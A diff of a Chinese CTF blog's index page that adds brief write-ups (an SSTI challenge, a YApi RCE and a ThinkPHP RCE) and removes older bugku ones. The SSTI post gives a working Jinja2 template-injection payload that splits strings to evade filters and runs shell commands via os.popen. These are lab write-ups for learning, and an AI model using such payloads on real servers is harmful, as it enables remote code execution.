@@ -164,6 +164,280 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-xman2021-easyssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/xman2021-easyssti/">xman2021-easyssti</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/08/xman2021-easyssti/" class="archive-article-date">
+  	<time datetime="2021-08-08T11:58:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>gwctf2019的原题，现在也可以在buuctf上做——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
+<p>虽然网上很多都在用curl ip端口的方法，<del>不过那个方法我怎么都没复现出来。</del>终于找到了原因：防火墙没开，想让外网发现自己，必须把防火墙的相应端口打开</p>
+<p>还好找到这个大佬的做法——<a target="_blank" rel="noopener" href="https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload——&#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后把whoami换成ls之类的shell指令就行</p>
+<img src="/2021/08/08/xman2021-easyssti/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/08/xman2021-easyssti/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-buu-ezrce" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/04/buu-ezrce/">buu-ezrce</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/04/buu-ezrce/" class="archive-article-date">
+  	<time datetime="2021-08-04T03:37:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开后发现是yapi界面，直接搜“yapi漏洞”<br>前面的步骤按照这篇来就行——<a target="_blank" rel="noopener" href="https://blog.csdn.net/Trouble_99/article/details/118667625">https://blog.csdn.net/Trouble_99/article/details/118667625</a><br>最后改代码中ls为<br>ls ..;<br>ls ../..;<br>找到ffffffflllllaggggg<br>cat ../../ffffffflllllaggggg就行</p>
+<img src="/2021/08/04/buu-ezrce/1.PNG" class="" title="1.PNG">
+<img src="/2021/08/04/buu-ezrce/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/04/buu-ezrce/3.PNG" class="" title="3.PNG">
+<img src="/2021/08/04/buu-ezrce/4.PNG" class="" title="4.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/04/buu-ezrce/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-buu-easythinkphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/04/buu-easythinkphp/">buu-easythinkphp</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/04/buu-easythinkphp/" class="archive-article-date">
+  	<time datetime="2021-08-04T02:08:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开发现thinkphp就没办法了</p>
+<img src="/2021/08/04/buu-easythinkphp/1.PNG" class="" title="1.PNG">
+<p>后来看大佬的解答，用的是thinkphp低版本的rce漏洞<br>（thinkphpgui脚本）</p>
+<img src="/2021/08/04/buu-easythinkphp/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/04/buu-easythinkphp/3.PNG" class="" title="3.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/04/buu-easythinkphp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-buu-easyweb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -787,289 +1061,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-社工-伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/">bugku-web-社工-伪造</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:17:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这道题虽然既没技术含量（玩家角度），又骗金币，不过还挺好玩的</p>
-<p>打开后让输入qq号</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/1.PNG" class="" title="1.PNG">
-<p>放心输入就行，这个的功能就是抓取你的qq头像和昵称</p>
-<p>进去后发现一个“人”在线，因为装了最基础的ai，所以可以和她聊天</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/2.PNG" class="" title="2.PNG">
-<p>问flag会告知只会发给“男朋友”<br>原题思路是：根据上面的qq号找到她的男朋友，换成她男朋友的头像和昵称，然后清除浏览器缓存（这步很重要），重新抓取自己的qq号（直接输那个男朋友的qq不行，不信可以试试），然后问flag就行。</p>
-<p>但是比较难受的就是，那个号主早就改名了，而这个ai认不出新名字（是的，她只认名字，为那些被坑去换头像的默哀）<br>所以现在还需要改成那个账号最早的名字“小bug”</p>
-<p>另外就是改完qq名字以后（特别是改完头像），qq自己会有一个审核过程，所以清缓存也抓取不到的不要着急。<br>如果你真的遇到当天qq在整顿，全网不允许改名那种极特殊情况，那么很遗憾，金币白花了。</p>
-<p>另外就是一个小彩蛋，输入的内容有字数限制——</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-头等舱" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">bugku-web-头等舱</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:13:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>头等舱=flag在header<br>没意思，开burp两分钟，得flag五秒钟</p>
-<img src="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-变量1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">bugku-web-变量1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/" class="archive-article-date">
-  	<time datetime="2021-07-31T13:58:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后是php代码</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/1.PNG" class="" title="1.PNG">
-
-<p>逐行解释<br>第三行：包含flag1.php<br>第四行：接收一个args变量，若非空，则运行<br>第五行：给$args赋值（并没有用，只是为了让新手看着更直观）<br>第六行：利用正则表达式匹配，若不匹配，则程序直接die<br>第九行：输出$$args(eval没有用)</p>
-<p>关于正则表达式，网上这个解释感觉非常好——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^\w+$&#x2F; 两个&#x2F; &#x2F; 表明正则表达式的开始与结束 ^开始字符，$结束字符 \w 包含【a-z,A-Z,_,0-9】中的字符，+代表可以有一个，或多个\w </span><br><span class="line"> 总的加起来意思是 以[a-z,A-Z,_,0-9]中的其中一个字符开始，中间可以有任意个[a-z,A-Z,_,0-9]字符，最后再以[a-z,A-Z,_,0-9]中的一个字符结束 比如适合的有：a,a09,a_01,001 不适合的有a-5，@12，￥12，中文字符，这些都不在[a-z,A-Z,_,0-9]范围里面</span><br></pre></td></tr></table></figure>
-<p>相当于传入的值只能是大小写字母或数字，字符只能是“_”<br>所以不能传入别的字符，不能传shell了</p>
-<p>另外推荐一个比较好的正则表达式网站——<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
-<p>然后就是了解到：超全局变量——<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.superglobals.php">https://www.php.net/manual/zh/language.variables.superglobals.php</a></p>
-<p>这里用到$GLOBALS</p>
-<p>所以传值?args=GLOBALS,得到flag</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">展开全文 >></a>
         </p>
       
 
